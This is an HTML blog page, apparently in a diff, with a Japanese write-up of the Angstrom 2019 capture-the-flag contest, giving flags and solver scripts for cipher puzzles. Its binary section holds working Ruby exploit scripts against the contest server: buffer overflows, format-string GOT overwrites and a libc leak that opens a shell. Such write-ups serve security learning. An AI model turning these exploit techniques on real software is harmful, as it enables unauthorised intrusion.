@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang='en' dir='auto'><head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='Misc IRC  freenodeに入るとFLAG actf{like_discord_but_worse}  The mueller Report  PDFが渡されるので、とりあえずactfでgrepするとFLAG actf{no0o0o0_col1l1l1luuuusiioooon}  Blank PDF  PDFが渡されるが開けず、fileコマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG actf{knot_very_interesting}  Paper Trail  pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している actf{fake_math_papers}  Scratch It Out  project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される 最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる 地味に面白い actf{Th5_0pT1maL_LANgUaG3}  Web Control you  HTMLソースを見てFLAG actf{control_u_so_we_can&rsquo;t_control_you}  Crypto Classy Cipher  ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く actf{so_charming}  encrypted = &#39;:&lt;M?TLH8&lt;A:KFBG@V&#39; for i in range(0xff): for c in encrypted: print(chr((ord(c)-i) % 0xff), end=&#39;&#39;) Really Secure Algorithm  RSAのパラメータがe, p, q, cが渡されるので復号するだけ actf{really_securent_algorithm}  require_relative &#39;.'>
+<meta name='theme-color' content='#ffcd00'>
+
+<meta property='og:title' content='Angstrom2019 writeup • $ make life'>
+<meta property='og:description' content='Misc IRC  freenodeに入るとFLAG actf{like_discord_but_worse}  The mueller Report  PDFが渡されるので、とりあえずactfでgrepするとFLAG actf{no0o0o0_col1l1l1luuuusiioooon}  Blank PDF  PDFが渡されるが開けず、fileコマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG actf{knot_very_interesting}  Paper Trail  pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している actf{fake_math_papers}  Scratch It Out  project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される 最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる 地味に面白い actf{Th5_0pT1maL_LANgUaG3}  Web Control you  HTMLソースを見てFLAG actf{control_u_so_we_can&rsquo;t_control_you}  Crypto Classy Cipher  ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く actf{so_charming}  encrypted = &#39;:&lt;M?TLH8&lt;A:KFBG@V&#39; for i in range(0xff): for c in encrypted: print(chr((ord(c)-i) % 0xff), end=&#39;&#39;) Really Secure Algorithm  RSAのパラメータがe, p, q, cが渡されるので復号するだけ actf{really_securent_algorithm}  require_relative &#39;.'>
+<meta property='og:url' content='https://owlinux1000.github.io/blog/angstrom2019/'>
+<meta property='og:site_name' content='$ make life'>
+<meta property='og:type' content='article'><meta property='article:section' content='blog'><meta property='article:published_time' content='2019-04-25T21:57:22&#43;09:00'/><meta property='article:modified_time' content='2019-04-25T21:57:22&#43;09:00'/><meta name='twitter:card' content='summary'><meta name='twitter:site' content='@encry1024'>
+
+<meta name="generator" content="Hugo 0.73.0" />
+
+  <title>Angstrom2019 writeup • $ make life</title>
+  <link rel='canonical' href='https://owlinux1000.github.io/blog/angstrom2019/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'>
+<link rel='stylesheet' href='/assets/css/main.ab98e12b.css'><link rel='stylesheet' href='/css/custom.css'><style>
+:root{--color-accent:#ffcd00;}
+</style>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-154126244-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+  
+
+</head>
+<body class='page type-blog has-sidebar'>
+
+  <div class='site'><div id='sidebar' class='sidebar'>
+  <a class='screen-reader-text' href='#main-menu'>Skip to Main Menu</a>
+
+  <div class='container'><section class='widget widget-about sep-after'>
+  <header>
+    
+    <div class='logo'>
+      <a href='/'>
+        <img src='/images/me.jpg'>
+      </a>
+    </div>
+    
+    <h2 class='title site-title '>
+      <a href='/'>
+      $ make life
+      </a>
+    </h2>
+    <div class='desc'>
+    Welcome to my homepage :)
+    </div>
+  </header>
+
+</section>
+</div>
+
+  <div class='sidebar-overlay'></div>
+</div><div class='main'><nav id='main-menu' class='menu main-menu' aria-label='Main Menu'>
+  <div class='container'>
+    <a class='screen-reader-text' href='#content'>Skip to Content</a>
+
+<button id='sidebar-toggler' class='sidebar-toggler' aria-controls='sidebar'>
+  <span class='screen-reader-text'>Toggle Sidebar</span>
+  <span class='open'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="3" y1="12" x2="21" y2="12" />
+<line x1="3" y1="6" x2="21" y2="6" />
+<line x1="3" y1="18" x2="21" y2="18" />
+</svg>
+</span>
+  <span class='close'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="18" y1="6" x2="6" y2="18" />
+<line x1="6" y1="6" x2="18" y2="18" />
+</svg>
+</span>
+</button>
+    <ul><li class='item'>
+        <a href='/resume/'>Résumé</a>
+      </li><li class='item'>
+        <a href='/blog/'>Blog</a>
+      </li><li class='item'>
+        <a href='/private/'>Private</a>
+      </li></ul>
+  </div>
+</nav><div class='header-widgets'>
+        <div class='container'></div>
+      </div>
+
+      <header id='header' class='header site-header'>
+        <div class='container sep-after'>
+          <div class='header-info'><p class='site-title title'>$ make life</p><p class='desc site-desc'>Making the world more secure</p>
+          </div>
+        </div>
+      </header>
+
+      <main id='content'>
+
+
+<article lang='en' class='entry'>
+  <header class='header entry-header'>
+  <div class='container sep-after'>
+    <div class='header-info'>
+      <h1 class='title'>Angstrom2019 writeup</h1>
+      
+
+    </div>
+    <div class='entry-meta'>
+  <span class='posted-on'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
+<line x1="16" y1="2" x2="16" y2="6" />
+<line x1="8" y1="2" x2="8" y2="6" />
+<line x1="3" y1="10" x2="21" y2="10" />
+</svg>
+<span class='screen-reader-text'>Posted on </span>
+  <time class='entry-date' datetime='2019-04-25T21:57:22&#43;09:00'>2019, Apr 25</time>
+</span>
+
+  
+  
+<span class='reading-time'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><circle cx="12" cy="12" r="10" />
+<polyline points="12 6 12 12 15 15" />
+</svg>
+3 mins read
+</span>
+
+
+</div>
+
+
+  </div>
+</header>
+
+  
+  
+
+  <div class='container entry-content'>
+  <h2 id="misc">Misc</h2>
+<h3 id="irc">IRC</h3>
+<ul>
+<li>freenodeに入るとFLAG</li>
+<li><strong>actf{like_discord_but_worse}</strong></li>
+</ul>
+<h2 id="the-mueller-report">The mueller Report</h2>
+<ul>
+<li>PDFが渡されるので、とりあえず<code>actf</code>でgrepするとFLAG</li>
+<li><strong>actf{no0o0o0_col1l1l1luuuusiioooon}</strong></li>
+</ul>
+<h2 id="blank-pdf">Blank PDF</h2>
+<ul>
+<li>PDFが渡されるが開けず、<code>file</code>コマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG</li>
+<li><strong>actf{knot_very_interesting}</strong></li>
+</ul>
+<h2 id="paper-trail">Paper Trail</h2>
+<ul>
+<li>pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している</li>
+<li><strong>actf{fake_math_papers}</strong></li>
+</ul>
+<h2 id="scratch-it-out">Scratch It Out</h2>
+<ul>
+<li>project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる</li>
+<li>project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される</li>
+<li>最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる</li>
+<li>地味に面白い</li>
+<li><strong>actf{Th5_0pT1maL_LANgUaG3}</strong></li>
+</ul>
+<h2 id="web">Web</h2>
+<h3 id="control-you">Control you</h3>
+<ul>
+<li>HTMLソースを見てFLAG</li>
+<li><strong>actf{control_u_so_we_can&rsquo;t_control_you}</strong></li>
+</ul>
+<h2 id="crypto">Crypto</h2>
+<h3 id="classy-cipher">Classy Cipher</h3>
+<ul>
+<li>ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く</li>
+<li><strong>actf{so_charming}</strong></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">encrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;:&lt;M?TLH8&lt;A:KFBG@V&#39;</span>
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0xff</span>):
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> encrypted:
+        <span style="color:#66d9ef">print</span>(chr((ord(c)<span style="color:#f92672">-</span>i) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0xff</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</code></pre></div><h3 id="really-secure-algorithm">Really Secure Algorithm</h3>
+<ul>
+<li>RSAのパラメータがe, p, q, cが渡されるので復号するだけ</li>
+<li><strong>actf{really_securent_algorithm}</strong></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require_relative <span style="color:#e6db74">&#39;../../tools/ctf/crypto.rb&#39;</span>
+
+p <span style="color:#f92672">=</span> <span style="color:#ae81ff">8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889</span>
+q <span style="color:#f92672">=</span> <span style="color:#ae81ff">7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493</span>
+e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349</span>
+
+rsa <span style="color:#f92672">=</span> <span style="color:#66d9ef">RSA</span><span style="color:#f92672">.</span>new(e, p <span style="color:#f92672">*</span> q, p, q)
+m <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>decrypt(c)
+print(<span style="color:#f92672">[</span>m<span style="color:#f92672">.</span>to_s(<span style="color:#ae81ff">16</span>)<span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#34;H*&#34;</span>))
+</code></pre></div><h2 id="half-and-half">Half and Half</h2>
+<ul>
+<li>ソースコードが渡されるので呼んでソルバを書くだけ
+<ul>
+<li>24文字を12byteに分割しxor取った値に等しくなるようにする</li>
+<li>フラグフォーマットは、<code>actf{</code>なので先頭5byteと後半の5byteもxorして判明(<code>taste</code>)</li>
+<li>問題文から<code>taste</code>に合うような単語で<code>coffee</code>を<code>actf{</code>の後に繋げると後半が<code>good</code>と文章が成り立つ</li>
+</ul>
+</li>
+<li><strong>actf{coffee_tastes_good}</strong></li>
+</ul>
+<h2 id="runes">Runes</h2>
+<ul>
+<li>Paillier暗号のパラメータn, g と暗号文cが渡されるので復号するだけ
+<ul>
+<li>復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている</li>
+</ul>
+</li>
+<li><strong>actf{crypto_lives}</strong></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;gmp&#39;</span>
+
+n <span style="color:#f92672">=</span> <span style="color:#66d9ef">GMP</span><span style="color:#f92672">::</span>Z(<span style="color:#ae81ff">99157116611790833573985267443453374677300242114595736901854871276546481648883</span>)
+p <span style="color:#f92672">=</span> <span style="color:#ae81ff">310013024566643256138761337388255591613</span>
+q <span style="color:#f92672">=</span> <span style="color:#ae81ff">319848228152346890121384041219876391791</span>
+g <span style="color:#f92672">=</span> <span style="color:#66d9ef">GMP</span><span style="color:#f92672">::</span>Z(<span style="color:#ae81ff">99157116611790833573985267443453374677300242114595736901854871276546481648884</span>)
+c <span style="color:#f92672">=</span> <span style="color:#66d9ef">GMP</span><span style="color:#f92672">::</span>Z(<span style="color:#ae81ff">2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869</span>)
+l <span style="color:#f92672">=</span> <span style="color:#66d9ef">GMP</span><span style="color:#f92672">::</span>Z((p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>lcm(q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">L</span>(u, n)
+  (u <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span> n
+<span style="color:#66d9ef">end</span>
+c_lambda <span style="color:#f92672">=</span> L(c<span style="color:#f92672">.</span>powmod(l, n<span style="color:#f92672">.</span>pow(<span style="color:#ae81ff">2</span>)), n)
+g_lambda <span style="color:#f92672">=</span> <span style="color:#66d9ef">GMP</span><span style="color:#f92672">::</span>Z(L(g<span style="color:#f92672">.</span>powmod(l, n<span style="color:#f92672">.</span>pow(<span style="color:#ae81ff">2</span>)), n)<span style="color:#f92672">.</span>to_s<span style="color:#f92672">.</span>to_i)<span style="color:#f92672">.</span>invert(n)
+m <span style="color:#f92672">=</span> ((c_lambda <span style="color:#f92672">*</span> g_lambda) <span style="color:#f92672">%</span> n)<span style="color:#f92672">.</span>to_s<span style="color:#f92672">.</span>to_i<span style="color:#f92672">.</span>to_s(<span style="color:#ae81ff">16</span>)
+print(<span style="color:#f92672">[</span>m<span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#34;H*&#34;</span>))
+</code></pre></div><h2 id="binary">Binary</h2>
+<h3 id="aquarium">Aquarium</h3>
+<ul>
+<li>gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ</li>
+<li><strong>actf{overflowed_more_than_just_a_fish_tank}</strong></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+
+<span style="color:#75715e">#z = Sock.new &#34;localhost&#34;, 9999</span>
+z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;shell.actf.co&#34;</span>, <span style="color:#ae81ff">19305</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x98</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x4011b6</span>)
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;1&#34;</span>
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;1&#34;</span>
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;1&#34;</span>
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;1&#34;</span>
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;1&#34;</span>
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;1&#34;</span>
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+z<span style="color:#f92672">.</span>sendline payload
+
+puts z<span style="color:#f92672">.</span>recv
+</code></pre></div><h3 id="chain-of-rope">Chain of Rope</h3>
+<ul>
+<li>名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)</li>
+<li><strong>actf{dark_web_bargains}</strong></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+
+z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#ae81ff">9999</span>
+z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;shell.actf.co&#34;</span>, <span style="color:#ae81ff">19400</span>
+
+puts z<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;access</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;1&#34;</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x38</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x401231</span>)
+z<span style="color:#f92672">.</span>sendline payload
+
+p z<span style="color:#f92672">.</span>recv
+</code></pre></div><h3 id="purchases">Purchases</h3>
+<ul>
+<li>FSBがある64bitバイナリで、flag出力用の関数があるのでそこに飛ばしてあげる</li>
+<li>関数の最後にGOTによるアドレス解決がされていないputs関数があるので、putsのGOTをflag出力関数で上書きする
+<ul>
+<li>末尾2byteですむので楽に書き換えられる</li>
+</ul>
+</li>
+<li><strong>actf{limited_edition_flag}</strong></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+<span style="color:#75715e"># z = Sock.new &#34;localhost&#34;, 9999</span>
+z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;shell.actf.co&#34;</span>, <span style="color:#ae81ff">19011</span>
+puts z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;? &#34;</span>
+z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;%4534c%10$hnAAAA</span><span style="color:#ae81ff">\x18\x40\x40</span><span style="color:#e6db74">&#34;</span>
+puts z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;else. &#34;</span>
+puts z<span style="color:#f92672">.</span>recv
+</code></pre></div><h3 id="returns">Returns</h3>
+<ul>
+<li>Purchasesのflag出力用関数が無い版でそれ以外はすべて同じ</li>
+<li>libcが配布されているので、FSBでlibcのアドレスリークして、GOT overwrite でOne gadgetに飛ばしてシェルを奪う</li>
+<li>出力バイトの関係から分割して書き込むために、はじめに<code>puts@got</code>をmainに書き換えておき何度もFSBを使えるようにする</li>
+<li><code>__stack_chk_fail@got</code>は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える</li>
+<li>最後に、<code>puts@got</code>を<code>__stack_chk_fail@got</code>になおしてあげればOne gadgetが実行される</li>
+<li><strong>actf{no_returns_allowed}</strong></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+<span style="color:#75715e"># coding: utf-8</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+<span style="color:#75715e">#z = Sock.new &#34;localhost&#34;, 8888</span>
+z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;shell.actf.co&#34;</span>, <span style="color:#ae81ff">19307</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">:debug</span>
+libc <span style="color:#f92672">=</span> <span style="color:#66d9ef">ELF</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;./libc.so.6&#34;</span>
+<span style="color:#75715e">#z = Sock.new &#34;shell.actf.co&#34;, 19011</span>
+puts z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;? &#34;</span>
+
+<span style="color:#75715e"># Leaking libc address and overwriting puts@got to the entrypoint of main function</span>
+z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;%4518c%11$hnAAAABBB%17$p</span><span style="color:#ae81ff">\x18\x40\x40</span><span style="color:#e6db74">&#34;</span>
+data <span style="color:#f92672">=</span> z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;? &#34;</span>
+data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>gsub(<span style="color:#e6db74">/\s/</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+libc_start_main <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>match(<span style="color:#e6db74">/BBB(.*)@@\./</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span>chop<span style="color:#f92672">.</span>to_i(<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">240</span>
+libc_base <span style="color:#f92672">=</span> libc_start_main <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;__libc_start_main&#39;</span><span style="color:#f92672">]</span>
+puts <span style="color:#e6db74">&#34;libc base address = </span><span style="color:#e6db74">#{</span>libc_base<span style="color:#f92672">.</span>to_s(<span style="color:#ae81ff">16</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+
+one_gadget <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf02a4</span>
+high <span style="color:#f92672">=</span> (one_gadget <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff00000000</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>
+low <span style="color:#f92672">=</span> one_gadget <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+llow <span style="color:#f92672">=</span> (low <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff0000</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>
+hlow <span style="color:#f92672">=</span> low <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>
+
+<span style="color:#75715e"># Overwriting __stack_chk_fail@got to one gadget RCE</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%</span><span style="color:#e6db74">#{</span>high<span style="color:#e6db74">}</span><span style="color:#e6db74">c%11$hnAAAABBBBBBB</span><span style="color:#ae81ff">\x2c\x40\x40</span><span style="color:#e6db74">&#34;</span>
+z<span style="color:#f92672">.</span>sendline payload
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;? &#34;</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%</span><span style="color:#e6db74">#{</span>hlow<span style="color:#e6db74">}</span><span style="color:#e6db74">c%11$hnAAAABBBBBBB</span><span style="color:#ae81ff">\x28\x40\x40</span><span style="color:#e6db74">&#34;</span>
+z<span style="color:#f92672">.</span>sendline payload
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;? &#34;</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%</span><span style="color:#e6db74">#{</span>llow<span style="color:#e6db74">}</span><span style="color:#e6db74">c%11$hnAAAABBBBBBB</span><span style="color:#ae81ff">\x2a\x40\x40</span><span style="color:#e6db74">&#34;</span>
+z<span style="color:#f92672">.</span>sendline payload
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;? &#34;</span>
+
+<span style="color:#66d9ef">STDIN</span><span style="color:#f92672">.</span>gets
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%4892c%11$hnAAAABBB%17$p</span><span style="color:#ae81ff">\x18\x40\x40</span><span style="color:#e6db74">&#34;</span>
+z<span style="color:#f92672">.</span>sendline payload
+
+z<span style="color:#f92672">.</span>interact
+</code></pre></div>
+</div>
+
+  
+<footer class='entry-footer'>
+  <div class='container sep-before'><div class='categories'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M22,19a2,2,0,0,1-2,2H4a2,2,0,0,1-2-2V5A2,2,0,0,1,4,3H9l2,3h9a2,2,0,0,1,2,2Z" />
+</svg>
+<span class='screen-reader-text'>Categories: </span><a class='category' href='/categories/writeup/'>writeup</a></div>
+
+  </div>
+</footer>
+
+
+</article>
+
+<nav class='entry-nav'>
+  <div class='container'><div class='prev-entry sep-before'>
+      <a href='/blog/volga2019/'>
+        <span aria-hidden='true'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="20" y1="12" x2="4" y2="12" />
+<polyline points="10 18 4 12 10 6" />
+</svg>
+ Previous</span>
+        <span class='screen-reader-text'>Previous post: </span>VolgaCTF 2019 writeup</a>
+    </div><div class='next-entry sep-before'>
+      <a href='/blog/yara/'>
+        <span class='screen-reader-text'>Next post: </span>平成のうちに理解しておくYara 入門<span aria-hidden='true'>Next <svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="4" y1="12" x2="20" y2="12" />
+<polyline points="14 6 20 12 14 18" />
+</svg>
+</span>
+      </a>
+    </div></div>
+</nav>
+
+
+
+
+      </main>
+
+      <footer id='footer' class='footer'>
+        <div class='container sep-before'><section class='widget widget-social_menu sep-after'><nav aria-label='Social Menu'>
+    <ul><li>
+        <a href='https://github.com/owlinux1000' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Github account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg>
+</a>
+      </li><li>
+        <a href='https://facebook.com/MunifTanjim' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Facebook account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />
+</svg>
+</a>
+      </li><li>
+        <a href='https://twitter.com/encry1024' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Twitter account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
